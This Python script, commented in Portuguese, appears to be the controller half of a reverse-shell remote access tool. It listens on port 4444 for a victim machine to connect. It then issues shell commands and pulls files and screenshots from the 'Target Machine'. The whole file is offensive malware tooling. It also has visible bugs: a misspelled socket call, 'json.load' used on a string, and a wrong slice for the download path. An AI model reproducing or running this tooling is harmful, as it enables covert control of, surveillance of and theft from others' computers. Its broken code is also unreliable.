import socket # para criar uma nova conexão
from termcolor import colored # para dar cor ao terminal
import json
import os
import subprocess

def data_send(data):
    jsondata = json.dumps(data)
    target.sent(jsondata.encode())

def data_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.load(data)
        except ValueError:
            continue

def upload_file(file):
    f = open(file, 'rb')
    target.send(f.read())

def download_file(file):
    f = open(file, 'wb')
    target.settimeout(5)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout:
            break
    target.settimeout(None)
    f.close()


def t_commun():
    count = 0
    while True:
        comm = input('* Shell~%s: ' % str(ip))
        data_send(comm)

        if comm == 'exit':
            break
        elif comm == 'clear':
            os.system('clear' if os.name != 'nt' else 'cls')
        elif comm [:3] == 'cd ':
            pass 
        elif comm [:6] == 'upload':
            upload_file(comm[7:])
        elif comm [:8] == 'download':
            download_file(comm[:9])
        elif comm [:10] == 'screenshot':
            f = open('screenshot%d' % (count), 'wb')
            target.settimeout(5)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout:
                    break
            target.settimeout(None)
            f.close()
            count +=1

        elif comm == 'help':
            print(colored(
                '''\n
                exit: Close the sessions on the Target Machine.
                cd: Change the directory on the Target Machine. Use: cd <directory-name>.
                upload: Send a file to the Target Machine. Use: upload <path-file>
                download: Download a file from the Target Machine. download <path-file>
                screenshot: Takes a Screenshot from the Target Machine.
                clear: Clear the screen from the Terminal.
                help: Help the user to use the commands.
                '''))
        else:
            answer = data_recv()
            print(answer)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('172.22.163.174', 4444))

print(colored('[-] Waiting for connections', 'yellow'))
sock.listen(5)

target, ip = sock.accept()
print(colored(f'[+] Connected with: {str(ip)}', 'green'))
t_commun()
